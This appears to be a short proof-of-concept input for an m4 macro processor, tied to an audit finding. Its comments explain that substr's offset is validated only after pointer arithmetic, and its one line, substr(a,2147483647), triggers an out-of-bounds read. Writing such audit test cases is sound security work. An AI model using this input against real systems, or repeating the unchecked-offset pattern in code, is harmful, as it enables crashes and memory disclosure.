dnl PoC for audit-findings/001-substr-offset-causes-out-of-bounds-read.md
dnl The offset is validated only after the vulnerable build forms ap + offset and strlen() reads it.
substr(a,2147483647)
